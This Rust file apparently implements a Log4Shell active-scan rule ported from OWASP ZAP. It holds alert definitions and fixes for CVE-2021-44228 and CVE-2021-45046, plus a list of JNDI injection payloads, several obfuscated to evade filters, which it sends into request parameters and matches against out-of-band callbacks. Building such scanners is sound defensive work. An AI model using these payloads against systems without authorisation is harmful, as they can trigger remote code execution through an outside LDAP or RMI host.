//! Ported from ZAP Log4ShellScanRule (ascanrules, Apache License 2.0).
//!
//! Needs the OOB listener (`brainproxy oob start`); without it the rule sends
//! nothing, like ZAP without an active-scan OAST service. Differences: the JNDI
//! path is the token instead of ZAP's `abc` (so host-mode payloads, which have no
//! token in the host name, still correlate through the LDAP search DN), and in
//! host mode the patterns that only work through DNS (`jndi:dns://` and the
//! CVE-2021-45046 `127.0.0.1#...` hosts) are skipped. No technology filter: ZAP
//! only runs this against Java targets.

use crate::scan::active::{ActiveRule, BoxFuture, Cx, RuleScope};
use crate::scan::{AlertDef, Confidence, Risk};

const TAGS_44228: &[&str] =
    &["OWASP_2025_A03", "OWASP_2021_A06", "OWASP_2017_A09", "WSTG-v42-INPV-11", "OUT_OF_BAND", "CVE-2021-44228"];
const TAGS_45046: &[&str] =
    &["OWASP_2025_A03", "OWASP_2021_A06", "OWASP_2017_A09", "WSTG-v42-INPV-11", "OUT_OF_BAND", "CVE-2021-45046"];

static ALERT_44228: AlertDef = AlertDef {
    alert_ref: "40043-1",
    name: "Log4Shell (CVE-2021-44228)",
    risk: Risk::High,
    confidence: Confidence::Medium,
    cwe: 117,
    wasc: 20,
    description: "Apache Log4j2 <=2.14.1 JNDI features used in configuration, log messages, and parameters do not \
        protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log \
        messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup \
        substitution is enabled. From log4j 2.15.0, this behavior has been disabled by default.",
    solution: "Upgrade Log4j2 to version 2.17.1 or newer. In previous releases (>2.10) this behavior can be mitigated by \
        setting system property \"log4j2.formatMsgNoLookups\" to \"true\" or by removing the JndiLookup class from \
        the classpath (example: zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class). \
        Java 8u121 (see https://www.oracle.com/java/technologies/javase/8u121-relnotes.html) protects against remote \
        code execution by defaulting \"com.sun.jndi.rmi.object.trustURLCodebase\" and \
        \"com.sun.jndi.cosnaming.object.trustURLCodebase\" to \"false\".",
    references: &[
        "https://github.com/lunasec-io/lunasec/blob/c6bb0762b4ce308768baca72c7e34415402e9647/docs/blog/2021-12-09-log4j-zero-day.mdx",
        "https://nvd.nist.gov/vuln/detail/cve-2021-44228",
    ],
    tags: TAGS_44228,
};

static ALERT_45046: AlertDef = AlertDef {
    alert_ref: "40043-2",
    name: "Log4Shell (CVE-2021-45046)",
    risk: Risk::High,
    confidence: Confidence::Medium,
    cwe: 117,
    wasc: 20,
    description: "It was found that the fix to address CVE-2021-44228 in Apache Log4j 2.15.0 was incomplete in certain \
        non-default configurations. This could allow attackers to craft malicious input data using a JNDI Lookup \
        pattern resulting in an information leak and remote code execution in some environments.",
    solution: "Upgrade Log4j2 to version 2.17.1 or newer.",
    references: &[
        "https://github.com/lunasec-io/lunasec/blob/c6bb0762b4ce308768baca72c7e34415402e9647/docs/blog/2021-12-09-log4j-zero-day.mdx",
        "https://nvd.nist.gov/vuln/detail/cve-2021-45046",
    ],
    tags: TAGS_45046,
};

static ALERTS: [&AlertDef; 2] = [&ALERT_44228, &ALERT_45046];

/// `{0}` is the payload host, `{t}` the token.
const PATTERNS_44228: [&str; 10] = [
    "${jndi:ldap://{0}/{t}}",
    "${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{0}/{t}}",
    "${${::-j}ndi:rmi://{0}/{t}}",
    "${jndi:rmi://{0}/{t}}",
    "${${lower:jndi}:${lower:rmi}://{0}/{t}}",
    "${${lower:${lower:jndi}}:${lower:rmi}://{0}/{t}}",
    "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://{0}/{t}}",
    "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}://{0}/{t}}",
    "${jndi:dns://{0}/{t}}",
    "${jndi:${lower:l}${lower:d}a${lower:p}://{0}/{t}}",
];
const PATTERNS_45046: [&str; 3] = [
    "${jndi:ldap://127.0.0.1#a.{0}:1389/{t}}",
    "${jndi:ldap://127.0.0.1#a.{0}/{t}}",
    "${jndi:ldap://localhost#a.{0}/{t}}",
];

pub struct Log4Shell;

impl Log4Shell {
    async fn attack(&self, cx: &Cx, patterns: &[&str], alert: &'static AlertDef) {
        for pattern in patterns {
            if cx.stopped() {
                return;
            }
            let Some(p) = cx.oob_payload() else { return };
            if !p.dns && (pattern.contains("jndi:dns:") || pattern.contains('#')) {
                continue;
            }
            let attack = pattern.replace("{0}", &p.host).replace("{t}", &p.token);
            let request = cx.payload_request(&attack);
            let resp = cx.send(request.clone()).await.ok();
            let finding = alert.raise(cx.point().name.clone(), "").attack(attack);
            cx.oob_register(&p, finding, &request, resp.as_ref());
        }
    }
}

impl ActiveRule for Log4Shell {
    fn id(&self) -> u32 {
        40043
    }

    fn name(&self) -> &'static str {
        "Log4Shell"
    }

    fn alerts(&self) -> &'static [&'static AlertDef] {
        &ALERTS
    }

    fn scope(&self) -> RuleScope {
        RuleScope::Param
    }

    fn scan<'a>(&'a self, cx: &'a Cx) -> BoxFuture<'a> {
        Box::pin(async move {
            self.attack(cx, &PATTERNS_44228, &ALERT_44228).await;
            self.attack(cx, &PATTERNS_45046, &ALERT_45046).await;
        })
    }
}
